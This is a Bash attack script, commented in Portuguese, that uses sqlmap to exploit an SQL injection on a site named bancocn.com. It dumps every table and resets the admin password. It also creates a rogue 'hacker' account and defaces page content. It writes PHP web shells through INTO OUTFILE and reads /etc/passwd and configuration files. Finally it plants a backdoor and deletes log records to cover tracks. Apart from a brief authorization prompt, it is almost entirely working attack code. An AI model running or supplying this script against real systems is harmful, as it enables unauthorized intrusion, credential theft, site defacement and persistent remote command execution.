#!/bin/bash

# Script de Exploração Avançada SQL Injection - BancoCN
# ATENÇÃO: Este script MODIFICA dados no banco de dados!
# Use apenas em ambientes autorizados para testes.

URL="http://www.bancocn.com/cat.php?id=1"
PARAM="id"
DB="bancocn"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

echo -e "${CYAN}${BOLD}============================================================${NC}"
echo -e "${CYAN}${BOLD}  SCRIPT DE EXPLORAÇÃO AVANÇADA - SQL INJECTION${NC}"
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo ""
echo -e "${RED}${BOLD}ATENÇÃO: Este script irá MODIFICAR dados no banco de dados!${NC}"
echo -e "${RED}${BOLD}Use apenas em ambientes autorizados para testes!${NC}"
echo ""

# Confirmação
read -p "$(echo -e ${RED}Você tem autorização para modificar o banco de dados? \(digite SIM para continuar\): ${NC})" resposta
if [ "$resposta" != "SIM" ]; then
    echo -e "${RED}[-] Operação cancelada. Modificações não autorizadas.${NC}"
    exit 1
fi

echo ""
echo -e "${YELLOW}[*]${NC} Target: $URL"
echo -e "${YELLOW}[*]${NC} Parâmetro: $PARAM"
echo -e "${YELLOW}[*]${NC} Banco de dados: $DB"
echo ""

# ==========================================
# FASE 1: VALIDAÇÃO E RECONHECIMENTO
# ==========================================
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo -e "${CYAN}${BOLD}FASE 1: VALIDAÇÃO E RECONHECIMENTO${NC}"
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo ""

echo -e "${BLUE}[ETAPA 1]${NC} Detecção de SQL Injection"
sqlmap -u "$URL" -p $PARAM --dbms=mysql --level=3 --risk=2 --batch
echo ""

echo -e "${BLUE}[ETAPA 2]${NC} Coletando informações do sistema"
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT @@version, @@hostname, USER(), DATABASE()" --batch
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT @@secure_file_priv, @@datadir, @@basedir" --batch
sqlmap -u "$URL" -p $PARAM --sql-query="SHOW GRANTS FOR CURRENT_USER()" --batch
echo ""

echo -e "${BLUE}[ETAPA 3]${NC} Mapeamento completo do banco"
sqlmap -u "$URL" -p $PARAM -D $DB --tables --batch
echo ""

echo -e "${BLUE}[ETAPA 4]${NC} Analisando estrutura das tabelas"
sqlmap -u "$URL" -p $PARAM -D $DB -T users --columns --batch
sqlmap -u "$URL" -p $PARAM -D $DB -T pictures --columns --batch
sqlmap -u "$URL" -p $PARAM -D $DB -T categories --columns --batch
sqlmap -u "$URL" -p $PARAM -D $DB -T stats --columns --batch
echo ""

echo -e "${BLUE}[ETAPA 5]${NC} Fazendo backup dos dados originais"
sqlmap -u "$URL" -p $PARAM -D $DB -T users --dump --batch
sqlmap -u "$URL" -p $PARAM -D $DB -T pictures --dump --batch
sqlmap -u "$URL" -p $PARAM -D $DB -T categories --dump --batch
sqlmap -u "$URL" -p $PARAM -D $DB -T stats --dump --batch
echo ""

# ==========================================
# FASE 2: EXPLORAÇÃO E MODIFICAÇÃO
# ==========================================
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo -e "${CYAN}${BOLD}FASE 2: EXPLORAÇÃO E MODIFICAÇÃO DE DADOS${NC}"
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo ""

echo -e "${MAGENTA}[!]${NC} Iniciando modificações no banco de dados..."
echo ""

# Nova senha para admin (MD5 de "hacked123")
NOVA_SENHA_HASH="7b71be0e85318117d2e514ce2a2e222c"  # MD5 de "hacked123"
NOVA_SENHA="hacked123"

echo -e "${BLUE}[ETAPA 6]${NC} Modificando credenciais do administrador"
echo -e "${YELLOW}[*]${NC} Alterando senha do admin para: $NOVA_SENHA"
echo -e "${YELLOW}[*]${NC} Hash MD5: $NOVA_SENHA_HASH"
sqlmap -u "$URL" -p $PARAM --sql-query="UPDATE users SET password='$NOVA_SENHA_HASH' WHERE login='admin'" --batch
sleep 2
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT login, password FROM users WHERE login='admin'" --batch
echo ""

# Novo usuário
NOVO_USER="hacker"
NOVA_SENHA_USER_HASH=$(echo -n "pwned2024" | md5sum | cut -d' ' -f1)

echo -e "${BLUE}[ETAPA 7]${NC} Criando novo usuário administrador"
echo -e "${YELLOW}[*]${NC} Criando usuário: $NOVO_USER"
sqlmap -u "$URL" -p $PARAM --sql-query="INSERT INTO users (login, password) VALUES ('$NOVO_USER', '$NOVA_SENHA_USER_HASH')" --batch
sleep 2
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT * FROM users" --batch
echo ""

echo -e "${BLUE}[ETAPA 8]${NC} Modificando conteúdo das categorias"
sqlmap -u "$URL" -p $PARAM --sql-query="UPDATE categories SET txt='<h1>HACKED BY SQL INJECTION</h1><p>Este site foi comprometido via SQL Injection.</p>' WHERE id=1" --batch
echo ""

echo -e "${BLUE}[ETAPA 9]${NC} Manipulando estatísticas"
sqlmap -u "$URL" -p $PARAM --sql-query="UPDATE stats SET count=999999 WHERE ip='192.168.229.1'" --batch
echo ""

echo -e "${BLUE}[ETAPA 10]${NC} Inserindo registros maliciosos"
sqlmap -u "$URL" -p $PARAM --sql-query="INSERT INTO pictures (title, img, cat) VALUES ('HACKED', 'malicious.jpg', 1)" --batch
echo ""

# ==========================================
# FASE 3: ESCALAÇÃO DE PRIVILÉGIOS
# ==========================================
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo -e "${CYAN}${BOLD}FASE 3: TENTATIVAS DE ESCALAÇÃO DE PRIVILÉGIOS${NC}"
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo ""

echo -e "${BLUE}[ETAPA 11]${NC} Verificando privilégios de escrita de arquivo"
SECURE_FILE=$(sqlmap -u "$URL" -p $PARAM --sql-query="SELECT @@secure_file_priv" --batch 2>/dev/null | grep -i "NULL\|empty" || echo "")

if [ ! -z "$SECURE_FILE" ]; then
    echo -e "${GREEN}[+]${NC} secure_file_priv pode estar desabilitado! Tentando escrever arquivo..."
    
    echo -e "${YELLOW}[*]${NC} Tentando escrever webshell PHP"
    sqlmap -u "$URL" -p $PARAM --sql-query="SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'" --batch
    
    # Tentar outros caminhos
    for path in "/var/www/html/bancocn/shell.php" "/tmp/shell.php" "/var/www/shell.php"; do
        echo -e "${YELLOW}[*]${NC} Tentando escrever em $path"
        sqlmap -u "$URL" -p $PARAM --sql-query="SELECT '<?php eval(\$_POST[\"x\"]); ?>' INTO OUTFILE '$path'" --batch
    done
else
    echo -e "${YELLOW}[!]${NC} secure_file_priv está habilitado. Escrita de arquivo pode não funcionar."
fi
echo ""

echo -e "${BLUE}[ETAPA 12]${NC} Tentando ler arquivos do sistema"
for file in "/etc/passwd" "/etc/hosts" "/var/www/html/cat.php" "/var/www/html/config.php" "/var/www/html/db.php"; do
    echo -e "${YELLOW}[*]${NC} Tentando ler $file"
    sqlmap -u "$URL" -p $PARAM --sql-query="SELECT LOAD_FILE('$file')" --batch
    sleep 1
done
echo ""

echo -e "${BLUE}[ETAPA 13]${NC} Tentando executar comandos do sistema"
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT '#!/bin/bash\nid > /tmp/pwned.txt' INTO DUMPFILE '/tmp/exploit.sh'" --batch
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO DUMPFILE '/var/www/html/cmd.php'" --batch
echo ""

# ==========================================
# FASE 4: PERSISTÊNCIA E COBERTURA
# ==========================================
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo -e "${CYAN}${BOLD}FASE 4: PERSISTÊNCIA E COBERTURA DE RASTROS${NC}"
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo ""

echo -e "${BLUE}[ETAPA 14]${NC} Criando backdoor na tabela users"
sqlmap -u "$URL" -p $PARAM --sql-query="UPDATE users SET password='backdoor_hash_here' WHERE id=1" --batch
echo ""

echo -e "${BLUE}[ETAPA 15]${NC} Tentando limpar logs"
sqlmap -u "$URL" -p $PARAM --sql-query="DELETE FROM stats WHERE ip LIKE '%192.168%'" --batch
sqlmap -u "$URL" -p $PARAM --sql-query="UPDATE stats SET count=0 WHERE count > 1000" --batch
echo ""

echo -e "${BLUE}[ETAPA 16]${NC} Verificação final das modificações"
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT * FROM users" --batch
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT COUNT(*) as total FROM users" --batch
sqlmap -u "$URL" -p $PARAM --sql-query="SELECT * FROM categories WHERE id=1" --batch
echo ""

# ==========================================
# RESUMO FINAL
# ==========================================
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo -e "${CYAN}${BOLD}EXPLORAÇÃO CONCLUÍDA${NC}"
echo -e "${CYAN}${BOLD}============================================================${NC}"
echo ""

echo -e "${GREEN}[+]${NC} Modificações realizadas:"
echo -e "${YELLOW}  ✓${NC} Senha do admin alterada"
echo -e "${YELLOW}  ✓${NC} Novo usuário criado"
echo -e "${YELLOW}  ✓${NC} Conteúdo das categorias modificado"
echo -e "${YELLOW}  ✓${NC} Estatísticas manipuladas"
echo -e "${YELLOW}  ✓${NC} Tentativas de escrita de arquivo realizadas"
echo -e "${YELLOW}  ✓${NC} Tentativas de leitura de arquivo realizadas"
echo ""

echo -e "${MAGENTA}[!]${NC} Credenciais criadas/modificadas:"
echo -e "${YELLOW}  Admin:${NC} admin / $NOVA_SENHA"
echo -e "${YELLOW}  Novo usuário:${NC} $NOVO_USER / pwned2024"
echo ""

echo -e "${YELLOW}[*]${NC} Dados salvos em: ~/.local/share/sqlmap/output/www.bancocn.com/"
echo -e "${MAGENTA}[!]${NC} Lembre-se: Todas as modificações foram registradas no banco de dados!"
echo ""

read -p "$(echo -e ${YELLOW}Deseja abrir SQL shell interativo para exploração adicional? \(s/N\): ${NC})" resposta
if [ "$resposta" = "s" ] || [ "$resposta" = "S" ]; then
    echo ""
    sqlmap -u "$URL" -p $PARAM --sql-shell
fi

echo ""
echo -e "${GREEN}[+]${NC} Script finalizado!"

